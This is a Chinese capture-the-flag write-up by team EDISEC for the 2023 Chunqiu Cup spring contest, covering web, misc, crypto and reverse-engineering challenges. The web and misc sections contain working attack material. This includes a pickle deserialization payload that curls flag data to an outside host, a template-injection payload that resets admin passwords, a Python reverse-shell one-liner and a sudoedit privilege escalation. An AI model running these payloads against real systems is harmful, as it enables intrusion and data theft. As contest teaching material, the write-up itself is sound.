---
title: 2023 年春秋杯春季赛 - WriteUp By EDISEC
contest: 春秋杯春季赛 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- phpstudy漏洞
- numpy_pickle
- qqcms_SSTI
- ezrust
- php_again_opcache
- sudo提权
- Pell方程
- EC_ElGamal
- 数独md5
- VMP_UPX
- z3求解
- EDISEC
attack_chain:
- 'Web phpstudy: 修改 admin 密码 + 勾选系统权限 + 查看文件下载 flag'
- 'Web easypy: numpy.loads(pickle) opcode 手搓 + base64 编码过滤 R'
- 'Web qqcms: SSTI 模板注入 {{loop sql=...}} 改密码 + 文件包含读 flag'
- 'Web ezrust: 当前目录即 work，./flag 路径穿越'
- 'Web php_again: opcache file_cache + bind_id + 修改 bin 文件时间戳上传'
- 'Misc sudo: nano -- /flag 提权读 flag'
- 'Misc piphack: socket AF_UNIX + pickle 反序列化 + SCM_RIGHTS'
- 'Misc wordle: 猜单词'
- 'Misc 58与64: 14268 个 base58 编码 + base64 套娃'
- 'Crypto checkin: Pell 方程 N=1117 + 二项式展开'
- 'Crypto cr2: EC-ElGamal + SHA256 k2 + MD5 key + AES-ECB'
- 'RE sum: 数独 + 9 个 1-9 之和=405 + md5(405)'
- 'RE Poisoned_tea: VMP 字符串改 UPX + upx 4.0.2 脱壳 + TEA 36 轮'
- 'RE Pytrans: pyinstxtractor 解包 + uncopyle6 反编译 + z3 约束求解'
key_payload: '''pell N=1117, key[]={0x05,0x02,9,7,0}, 数独和 405, md5(405)=bbcbff5c...'''
one_liner: 春秋杯 EDISEC 11 题：phpstudy+pickle+SSTI+Pell+EC_ElGamal+数独 md5+TEA 36 轮+pyinstxtractor。
lesson: 数独答案 9 个 1-9 之和恒为 405，md5 即可；VMP 字符串改 UPX 是经典脱壳绕过；pyinstxtractor+uncopyle6 解 PyInstaller。
quality: high
full_path: 2023年春秋杯春季赛-WriteUp_By_EDISEC.full.md
meta_path: 2023年春秋杯春季赛-WriteUp_By_EDISEC.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2023 年春秋杯春季赛 - WriteUp By EDISEC。春秋杯 EDISEC 11 题：phpstudy+pickle+SSTI+Pell+EC_ElGamal+数独 md5+TEA 36 轮+pyinstxtractor。。关键路径：Web phpstudy: 修改 admin 密码 + 勾选系统权限 + 查看文件下载 flag → Web easypy: numpy.loads...'
category: web
subcategory: web_other
tools_used:
- Z3
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/116586.html
reasoning_chain:
- 触发点：phpstudy 修改 admin 密码 + 勾选系统权限 → 假设进管理后台 → 动作：查看文件下载 flag
- actor easypy numpy.loads(pickle) 手搓 opcode + base64 编码过滤 R → 观察：RCE
- actor qqcms SSTI {{loop sql=...}} 改密码 + 文件包含读 flag → 假设模板注入
- actor ezrust 当前目录即 work →假设路径穿越 → 动作：./flag 拿 flag
- actor php_again opcache file_cache + bind_id → 假设修改 bin 文件时间戳上传 → 观察：RCE
- actor sudo nano -- /flag 提权读 flag → actor piphack socket AF_UNIX + pickle + SCM_RIGHTS
- actor Pell方程 N=1117 + 二项式展开 → actor EC-ElGamal + SHA256 k2 + MD5 key + AES-ECB
- actor 数独和405 + md5(405) → actor VMP 改 UPX 脱壳 + TEA 36 轮 → actor pyinstxtractor + z3
failed_attempts:
- 试图标准 opcache 编译 → 失败：需修改 bin 文件时间戳绕过
- 试图直接 pickle opcode → 失败：numpy.loads 需 base64 编码过滤
key_observations:
- 数独答案 9 个 1-9 之和恒为 405，md5 即可
- VMP 字符串改 UPX 是经典脱壳绕过
- pyinstxtractor + uncopyle6 解 PyInstaller
- opcache file_cache bind_id 走 bin 时间戳绕过
prerequisites:
- PHP opcache 编译缓存机制
- Python pickle opcode 手搓
- SSTI 模板注入
- PyInstaller 解包与反编译
---
# 2023年春秋杯春季赛-WriteUp By EDISEC

> 原文: https://www.ctfiot.com/116586.html
> ID: 116586

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

phpstudy

phpstudy漏洞修改admin密码

勾选系统权限，查看文件并下载flag

2

easypy

import numpy, base64
from flask import Flask, Response, requestapp = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])def index(): return '小p想要找一个女朋友，你能帮他找找看么？'

@app.route('/girlfriends', methods=['GET', 'POST'])def girlfriends(): if request.values.get('data'): data = request.values.get('data') numpydata = base64.b64decode(data) if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: return '不能走捷径啊' resp = numpy.loads(numpydata) return '可以的，要的就是一种感觉' return '有进步了,但是不多'

@app.route('/download', methods=['GET', 'POST'])def download(): with open('www.zip', 'rb') as (f): stream = f.read() response = Response(stream, content_type='application/octet-stream') response.headers['Content-disposition'] = 'attachment;filename=www.zip' return response

if __name__ == '__main__': app.run(host='0.0.0.0', port=80)
# okay decompiling .app.cpython-38.pyc

import numpy
import pickleimport base64import osopcode=b'''c__builtin__mapp0 0(S'curl xxx:
5555/`cat /flag`'tp10(cossystemg1tp20g0g2x81p30c__builtin__tuplep4(g3tx81.'''
code=base64.b64encode(opcode)print(code)
# pickle.loads(base64.b64decode(code))numpydata = base64.b64decode(code)if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: print('不能走捷径啊')else: resp = numpy.loads(numpydata) print("ok")

POST /girlfriends HTTP/1.1Host: eci-2ze5mdaorvazf0lpit4y.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0OUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Requested-With: XMLHttpRequestContent-Type: application/x-www-form-urlencodedContent-Length: 177
data=Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCAxMjQuNzAuMjA2LjIzODo1NTU1L2BjYXQgL2ZsYWdgJwp0cDEKMChjb3MKc3lzdGVtCmcxCnRwMgowZzAKZzIKgXAzCjBjX19idWlsdGluX18KdHVwbGUKcDQKKGczCnSBLg==

3

qqcms

可以直接修改改密码然后后台读文件

Search=%3FSearch%3D%7B%7Bloop+sql%3D%27update+qc_user+set+Password%3Dmd5%281%29%27%7D%7DAhisec%7B%7B%2Floop%7D%7D/admin/templates/edit.html?Name=../../../../../flag

4

ezrust

#（flag在work目录）当前目录GET /./flag HTTP/1.1Content-Length: 518
Host: 39.106.65.236:
29006User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:
109.0) Gecko/20100101 Firefox/112.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Requested-With: XMLHttpRequest

5

php_again

看代码 有几个小功能，压缩文件，写入文件，解压文件，phpinfo开了

看到opcache这里看到file_cache的问题，

看到了校验文件的位如果不通过就删除了

我们继续跟下去

远程的环境不一样，我们直接更改源码跟他一样，然后最后缺一个bind_id ，动态调试不太会，就去编译了php。

https://blog.csdn.net/ziqibit/article/details/129461718cd /usr/localwget https://www.php.net/distributions/php-8.2.2.tar.gztar -zxvf php-8.2.2.tar.gz && cd php-8.2.2apt-get install build-essential autoconf automake libtool libsqlite3-dev pkg-config libjpeg-dev libpng-dev libxml2-dev libbz2-dev libcurl4-gnutls-dev libssl-dev libffi-dev libwebp-dev libonig-dev libzip-dev
./configure --prefix=/usr/local/php --sysconfdir=/etc/php --with-openssl --with-zlib --with-bz2 --with-curl --enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql --enable-pcntl
./configure --prefix=/usr/local/php #安装地址--sysconfdir=/etc/php #设置文件地址--with-openssl #启用ssl--with-zlib --with-bz2 --with-curl #启用curl--enable-bcmath --enable-gd --with-webp --with-jpeg --with-mhash --enable-mbstring --with-imap-ssl --with-mysqli --enable-exif --with-ffi --with-zip --enable-sockets --with-pcre-jit --enable-fpm --with-pdo-mysql #支持mysql--with-pdo-pgsql #支持pgsql--enable-pcntl
make && make install

pip.ini  配置文件

这个system_id猜测就是跟服务器一样的了,然后我们给bin文件拉出来 010看下time那里有时间验证，我们要获取服务器的bin文件生成时间戳然后 头 + id 都相同，去修改时间戳，然后上传恶意文件。

import base64import requests

data = open('flag.zip','rb').read()print(data)base_Data = base64.b64encode(data)print(base_Data.decode())pars = {"data":
base_Data.decode()}url = requests.post("http://eci-2zeaqi1urh7o8mgpdl6q.cloudeci1.ichunqiu.com/?action=1365",data=pars)

import socketimport pickleimport osimport array
class Person(): def __reduce__(self): command=r"cat /flag>/tmp/pwned" return (os.system,(command,))
p=Person()opcode=pickle.dumps(p)print(opcode)f = open("exp.data","wb")f.write(opcode)f.close()
# 定义抽象命名空间套接字路径 没ss
# socket_path = " "+os.popen("ss -lx | grep '@'|awk '{print $5}'").read().replace("@","").strip()socket_path = " listener-51-0"print(socket_path)def sendfds(sock, fds): '''Send an array of fds over an AF_UNIX socket.'''
# 创建套接字sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
# 连接到服务器sock.connect(socket_path)
# 准备发送的数据data = opcode
def send_fds(sock, msg, fds): return sock.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, array.array("i", fds))])
file = open("exp.data",'rb')fd = file.fileno()parent_r, child_w = os.pipe()fds = [fd,child_w,fd,fd]msg = bytes([len(fds) % 256])send_fds(sock,msg,fds)
# 关闭套接字sock.close()file.close()

02

Misc

1

sudo

没有vim vi，就用原生编辑器nanoEDITOR='nano -- /flag' sudoedit /etc/GAMELAB

2

piphack

https://mp.weixin.qq.com/s/a0kh4dDBIiq8lqi8kBswVw

import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx',8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);

tar -czvf file.tar.gz evalp/

3

wordle

猜单词

4

盲人隐藏了起来

补文件头得压缩包密码

图片尾部有个key

https://cybercompaacc.com/challenges/cryptography/crypto-tools/

flag{2c8ba897-0205-9bff-123d-281d12a24c38}

5

happy2forensics

tcp.port == 20 &&tcp.dstport==80

bitlocker:
120483-350966-299189-055297-225478-133463-431684-359403

大文件压缩包 导出

除了图片外还有两个异常文件

用脚本或者工具拼接分离的很多png文件，得到一串password

用DiskGenius文件挂载找到可疑压缩包，得到flag2.txt

用得到的password去解压缩包

flag{f97d5b05-d312-46ac-919c-a140d7054ac5}

6

58与64

base58_chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'base58_vals = {c: v for v, c in enumerate(base58_chars)}
def decode_base58(enc): num = 0 for c in enc: num *= 58 num += base58_vals[c] return num.to_bytes((num.bit_length() + 7) // 8, 'big')
for i in range(14268): with open(f"./tmp_dc7fe258d0d39f50f605eb64cc8189eb-1/{i}.txt", "r") as f: data = f.read().splitlines() dec = decode_base58(data[0]) print(dec) with open('flag.txt',"a") as f: f.write(dec.decode())
import base64with open('flag.txt', 'r') as f: data = f.read()def decode(data): try: dec = base64.b64decode(data) print(f'解密后:{dec}') decode(dec) 
except Exception: passdecode(data)

b'flag{640ce012-3d3a-446d-9d0e-5d2fe840063b}'

03

Crypto

1

checkin

from Crypto.Util.number import *import gmpy2n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101
def solve_pell(N, numTry = 100): cf = continued_fraction(sqrt(N)) for i in range(numTry): denom = cf.denominator(i) numer = cf.numerator(i) if numer^2 - N * denom^2 == 1: return numer, denom return None, None
x, y = solve_pell(N=1117)x1, y1 = x, yD = 1117flag1 = (enc1 - 1) // n^2 * gmpy2.invert(233, n) % nflag2 = (enc2%n^2 - 1) // n * gmpy2.invert(y1, n) % nflag = long_to_bytes(flag1)+long_to_bytes(flag2)print(flag) #3b'flag{11e89e28-4e27-47f0-a7c7-8e66c18881be}'

2

cr2

from Crypto.Util.number import *from Crypto.Util.Padding import pad
from random import randintfrom Crypto.Util.strxor import strxorfrom Crypto.Cipher import AES
from hashlib import sha256
from hashlib import md5
w, a, b, x = (31889563, 31153, 28517, 763220531)A, B, P = (1064988096, 802063264240, 12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527)G = (359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131, 9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770)M1 = (10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139, 7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921)M2 = (497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693, 8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462)B_ = (5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256, 10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370)ct = b'x1axfbxa2xe1x86x04xfakx9axa3xd15xb8x16x1dxbcxa9Sxf5;xfaxf1x08dn~xd4x94xa4;^*xf6xd7xf10xa3xe1k`x1f-xefx80x16x80x80xe2'
E = EllipticCurve(GF(P), [A, B])G, M1, M2, B_ = [E(_) for _ in [G, M1, M2, B_]]z = M1-w*G-a*x*M1-b*x*Gk2 = sha256(str(z[0]).encode()).digest()[:6]k2 = bytes_to_long(k2)key = k2 * B_key = md5(str(int(key[0])).encode()).digest()cipher = AES.new(key, AES.MODE_ECB)m = cipher.decrypt(ct)print(m)
# flag{63259ab8-4916-4095-8888-d92c2b003e18}

04

Re

1

sum

数独求解

ida 源码

int __cdecl main(int argc, const char **argv, const char **envp){ char *v3; // rbp int v4; // er14 unsigned int v5; // er12 __int64 i; // rbx char v7; // al int v8; // eax char *v9; // rax
 v3 = (char *)&matrix; v4 = 1; v5 = 0; puts("Welcome to Solver!"); do { for ( i = 0LL; i != 9; ++i ) { if ( !v3[i] ) { v7 = getchar(); if ( (unsigned __int8)(v7 - 49) > 8u ) v4 = 0; else v3[i] = v7 - 48; } v8 = v3[i]; v5 += v8; // v5 的值是 数独所有的数加起来的值 } v3 += 9; } while ( v3 != (char *)&matrix + 81 ); if ( v4 && (unsigned int)verify("Welcome to Solver!", argv) ) { puts("You Win!"); __snprintf_chk(buf, 32LL, 1LL, 32LL, "%d", v5); v9 = str2md5((__int64)buf, strlen(buf)); // md5加密 v5 __printf_chk(1LL, "flag is: flag{%s}nn", v9); exit(0); } puts("Again~"); return 0;}

unsigned char matrix[] ={0x05, 0x03, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x06,0x00, 0x00, 0x01, 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x09,0x08, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x00, 0x00,0x00, 0x06, 0x00, 0x00, 0x00, 0x03, 0x04, 0x00, 0x00, 0x08,0x00, 0x03, 0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x02,0x00, 0x00, 0x00, 0x06, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00,0x02, 0x08, 0x00, 0x00, 0x00, 0x00, 0x04, 0x01, 0x09, 0x00,0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x07,0x09};

def print_grid(arr): for i in range(9): for j in range(9): print(arr[i][j], end=" ") print()
def find_empty_location(arr, l): for row in range(9): for col in range(9): if(arr[row][col]==0): l[0]=row l[1]=col return True return False
def used_in_row(arr, row, num): for i in range(9): if(arr[row][i] == num): return True return False
def used_in_col(arr, col, num): for i in range(9): if(arr[i][col] == num): return True return False
def used_in_box(arr, row, col, num): for i in range(3): for j in range(3): if(arr[i+row][j+col] == num): return True return False
def check_location_is_safe(arr, row, col, num): return not used_in_row(arr, row, num) and not used_in_col(arr, col, num) and not used_in_box(arr, row - row%3, col - col%3, num)
def solve_sudoku(arr): l=[0,0] if(not find_empty_location(arr, l)): return True row=l[0] col=l[1] for num in range(1,10): if(check_location_is_safe(arr, row, col, num)): arr[row][col]=num if(solve_sudoku(arr)): return True arr[row][col] = 0 return False

print(grid)grid = [[0x05,0x03,0x00,0x00,0x07,0x00,0x00,0x00,0x00] ,[0x06,0x00,0x00,0x01,0x09,0x05,0x00,0x00,0x00],[0x00,0x09,0x08,0x00,0x00,0x00,0x00,0x06,0x00],[0x08,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x03],[0x04,0x00,0x00,0x08,0x00,0x03,0x00,0x00,0x01],[0x07,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x06],[0x00,0x06,0x00,0x00,0x00,0x00,0x02,0x08,0x00],[0x00,0x00,0x00,0x04,0x01,0x09,0x00,0x00,0x05],[0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x07,0x09]]

solve_sudoku(grid)print_grid(grid)

5 3 4 6 7 8 9 1 2 6 7 2 1 9 5 3 4 8 1 9 8 3 4 2 5 6 7 8 5 9 7 6 1 4 2 3 4 2 6 8 5 3 7 9 1 7 1 3 9 2 4 8 5 6 9 6 1 5 3 7 2 8 4 2 8 7 4 1 9 6 3 5 3 4 5 2 8 6 1 7 9

s = '534678912672195348198342567859761423426853791713924856961537284287419635345286179'x = 0for i in s: x += int(i)    print(x)

echo -n 405|openssl md5MD5(stdin)= bbcbff5c1f1ded46c25d28119a85c6c2

分析代码也就可以知道 把数独答案的所有数字加起来就是flag
无论顺序怎么排 都是 9 个 1-9
x = 0for i in range(1,10): x += i print(x*9)

flag{bbcbff5c1f1ded46c25d28119a85c6c2}

2

Poisoned_tea_CHELL

用 HxD 打开

快捷键 Ctrl + R 调出 替换界面，将 VMP 替换为 UPX.然后保存退出

使用 upx 4.0.2 版本，对修改后的文件 进行脱壳

偏移修改 dword_4020的值 所以 key[2] = 9

int KEY1 = 9;
int KEY2 = 7;
int key[] = { 0x05,0x02,KEY1,KEY2,0 };

#include<stdio.h>#include<stdlib.h>#include<strings.h>
int det(int rounds, int v1[2], int key[5]) { int v4; unsigned int v5; unsigned int v6; int i;
 v6 = v1[0]; v5 = v1[1]; v4 = 0xbeefbeef * rounds; for (i = 0; i < rounds; ++i) { v5 -= (v6 + ((v6 >> 5) ^ (16 * v6))) ^ (key[(v4 >> 11) & 3] + v4); v4 -= 0xbeefbeef; v6 -= (v5 + ((v5 >> 5) ^ (16 * v5))) ^ (key[v4 & 3] + v4);
 } v1[0] = v6; v1[1] = v5; return 0;}
unsigned int enflag[]={ 0xecfda301 ,0x61becdf5 ,0xb89e6c7d ,0xce36dc68 ,0x4b6e539e ,0x642eb504 ,0x54f9d33c ,0x6d06e365 ,0xea873d53 ,0xa4618507 ,0xd7b18e30 ,0xc45b4042 ,0,0};
int main(){ int KEY1 = 9; int KEY2 = 7; int key[] = { 0x05,0x02,KEY1,KEY2,0 }; int num_rounds = 36; int v[] = { 0,0,0 }; for (int _ = 0; enflag[_]; _ += 2) { v[0] = enflag[_]; v[1] = enflag[_ + 1]; det(num_rounds, v, key); enflag[_] = v[0]; enflag[_+1] = v[1]; } printf("%sn",enflag); return 0;}

Thisisflag{cdfec405-3f4b-457e-92fe-f6446098ee2e}

3

Pytrans

pyinstxtractor 工具解包，用 uncopyle6 解run.pyc 得到

import base64, zlib, ctypes
try: mylib = ctypes.cdll.LoadLibrary('./mylib.so')
except: print('file no exit!')else: a = []try: sstr = input("Please enter the 10 digits and ending with '\n': ").split(' ') if len(sstr) == 10: for i in sstr: a.append(int(i))
 mylib.check.argtypes = ( ctypes.POINTER(ctypes.c_int), ctypes.c_int) mylib.check.restype = ctypes.c_char_p scrambled_code_string = mylib.check((ctypes.c_int * len(a))(*a), len(a)) try: decoded_data = base64.b64decode(scrambled_code_string) uncompressed_data = zlib.decompress(decoded_data) exec(__import__('marshal').loads(uncompressed_data)) 
except: print('Incorrect input caused decryption failure!')
except: pass

from z3 import *s = Solver()a1 = [BitVec('a1%d' % i, 32) for i in range(10)]s.add( -27 * a1[7] + -11 * a1[6] + 16 * a1[5] + a1[0] + 2 * a1[1] - a1[2] + 8 * a1[3] - 14 * a1[4] + 26 * a1[8] + 17 * a1[9] == 14462)s.add(-30 * a1[8] + 13 * a1[5] + a1[3] + a1[1] + 2 * a1[0] - 15 * a1[4] - 24 * a1[6] + 16 * a1[7] + 36 * a1[9] == -2591)s.add(16 * a1[6] + -21 * a1[5] + 7 * a1[3] + 3 * a1[1] - a1[0] - a1[2] + 12 * a1[4] - 23 * a1[7] + 25 * a1[8] - 18 * a1[9] == 2517)s.add(-6 * a1[6] + 2 * a1[2] - a1[1] + 2 * a1[5] + 9 * a1[7] + 2 * a1[8] - 5 * a1[9] == 203)s.add(-5 * a1[8] + 6 * a1[7] + 3 * a1[1] - a1[3] - a1[5] + a1[6] + 5 * a1[9] == 3547)s.add(-9 * a1[8] + a1[4] + a1[2] + a1[7] - 5 * a1[9] == -7609)s.add(2 * a1[5] + -a1[3] - a1[4] + a1[8] + 6 * a1[9] == 4884)s.add(a1[6] - a1[7] + 2 * a1[8] == 1618)s.add(a1[4] - a1[6] + 2 * a1[9] == 1096)s.add(a1[8] + a1[4] + a1[3] + a1[2] + a1[1] + a1[0] - a1[5] - a1[6] - a1[7] - a1[9] == 711)s.add(2 * (2 * a1[4] + a1[3]) + 5 * a1[5] == 7151 )assert sat == s.check()ans = s.model()print(ans)for i in range(10): print(ans[a1[i]].as_long(),end=" ") #511 112 821 949 517 637 897 575 648 738

eJyNkz1s20YUgO9RlEKdJUWSZTsGgoJCWwRqq0C0Hf8EQWGgmYMCHdoe0gaU74liJZESSdm0Ek/q
1Mljhw7p1gJFp06dMnbuyLWT905Z2ncn27HToimlu3fvvXvfe++O/IO99hRo7NOIfzUYk0wwjwlA
9tyQ8D2IHJqYx9wc5vCQfbEqCgjPb6CFOSysszntADZ5Sxoy9zUTRYrkuCTNOVB0nqJLFFuagywM
jOjb2W0sEaNODE6MMhbO47ufsskPwNQPK/LGnGx4U1pKfk6ez1hQfd2uq+LnVd0iooVF5Iua5qBW
D9jkF+SiKouPDVETdaxhvWd4IJZp75LUsaIhl8TKwiNLg9ypEf2MK0RuzGHASPsOG7iyzsQqrsry
wDiF6BDrcmlg0qqLVaytM9Irt9g6kze1v6v0XUb5VmRlhxF9mXrVGVSvupPq1U5OjclPRK/p6N8p
uk6ZIXrxir72iv7iklrXsv4mevAbsZcp1ojuYk1XbkS3FXtRNdbP2cp6wa7pDmpvZA+J3dCx31BM
XZ9YumCvXWenV9k7/4f9D8vkz3+1rKiVXP2EtdZmo83JbBLEW/2vtjmimx40t9z2u1zubN57sr81
3PZ4z/Gkc7jTlyPuvP9Oe+/e5smuw90vN5zDbjDabPL22+/12ujI3Sd8Iznem/rjcNDm25Gz29no
7UiH7x3hzDlo9552MuAHcOU7oq+H5Wh8pL6lCk0Je8YkzI0TeAZUn/FImB2n021BVuiF0chNWobI
BdORsNK0o58fWaQIL4uxOxoP8e74OCumqfamHUtxTZUJOER5krP9j4foxmhjkGBkJ320xxEe+uE0
tp2OLX3PT2Lb9Vw/sN1A0jbpB5595Cd9+87j4M59+yXYZ1yROEaR7QfjadI8+4uelnGmMkVF5axq
hz1yZ5TATfr3tZm2KBGp+AzcM9CyMyscRWHgNTOQ566jDOLZw8j3+knTPg6nBDruou2Fie0nH/SG
rmf7sa3kU9VCLwyTceQHiR32dE+XeU8etdZE8dIvCotzy/LxeOgnonzpGfpxkuUjN/Awyw0xyMDP
Cu54TAeQmcqpj0+UwzQM1fmSCMMsr9sUxYvb6GQ5YmV5jcxMTCkHXzjVlEGaQSgqyqL/+qLE8nVd
M7P8QTilgssX0dql7/rKpO42sx6MQjkd4ofqdYoPaTLBpAuvQsOwTBMqUAIDLGhAgeaqYYFlVGHV
MEnj5FM7Knpt07zYUbqm8f/SLsffH2x7Vw==============

base 64 decode 后补个 pyc 文件头用 uncompyle6 解包

footprint = '3qzqns4hj6neeaxc!4a-%nd735_@4l6gnf1gd1v7hdmn1+$-953}81na^21vbnm3!n-#*f-e1d8_n2ty9uipok-n6r1802f7d1n9wez1c-f{0'print(footprint)xx0000 = []footprintlist = footprint.split('n')for i in range(len(footprintlist)): xx0000.append(list(footprintlist[i]))else:
 def xxxx000x0(num): xx000000 = format(num, '010b') return xx000000

 oxooxxxxxoooo = [] xx0000000 = input("Please enter the previous 10 digits again and ending with '\n': ").split(' ') if len(xx0000000) == 10: try: for i in xx0000000: oxooxxxxxoooo.append(int(i))
 
except: print('err input!') exit(-1)
 else: print('err input!') exit(-1) for i in range(len(oxooxxxxxoooo)): oxooxxxxxoooo[i] = list(xxxx000x0(oxooxxxxxoooo[i])) else: print(oxooxxxxxoooo) # 直接把生成的地图输出 xx0000x000 = oxooxxxxxoooo x, o = (0, 0) xx00x00x0xxx00 = [(x, o)] xx00x00x0xxx00input = list(input('input maze path:')) count = 0 while (x, o) != (9, 9): if count < len(xx00x00x0xxx00input): xx0000x0xxx00 = xx00x00x0xxx00input[count] if xx0000x0xxx00 == 'a': if o > 0 and xx0000x000[x][o - 1] == '0': o -= 1 count += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) elif xx0000x0xxx00 == 'd': if o < 9 and xx0000x000[x][o + 1] == '0': count += 1 o += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 'w': if x > 0 and xx0000x000[x - 1][o] == '0': count += 1 x -= 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 's': if x < 9 and xx0000x000[x + 1][o] == '0': count += 1 x += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: print('wrong!') exit(-1) else: print('wrong!') exit(-1)
 print('right! you maybe got it,flag is flag{the footprint of the maze path}')

